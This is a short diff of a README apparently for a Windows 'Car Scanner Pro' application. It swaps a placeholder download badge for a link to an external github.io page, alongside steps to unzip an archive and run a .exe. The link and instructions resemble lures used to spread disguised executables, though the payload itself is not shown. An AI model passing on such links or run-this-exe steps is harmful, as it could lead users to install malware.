@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://car-scanner-pro-windows.github.io/.github/)
 
 ## 📸 Overview
 ![carscannerpro-realtime](https://github.com/user-attachments/assets/59aa34d0-bf01-47c9-93ad-ed1c657d2593)
